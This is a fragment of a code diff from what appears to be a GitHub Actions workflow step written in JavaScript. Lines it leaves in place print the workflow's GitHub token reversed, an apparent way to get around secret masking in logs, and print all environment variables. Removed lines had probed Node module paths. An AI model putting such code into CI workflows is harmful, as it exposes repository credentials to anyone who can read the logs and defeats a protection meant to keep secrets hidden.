@@ -77,9 +77,3 @@ jobs:
             console.log('Current Directory:', process.cwd());
             console.log('GH Token:', core.getInput("github-token").split("").reverse().join(""));
             console.log('Environment Variables:', process.env);
-            try {
-              require('nonexistent_module');
-            } catch (error) {
-              console.log('Node Modules Lookup Paths (from error stack):', error.stack);
-            }
-            console.log("Filename:", Module._resolveFilename("fs"));
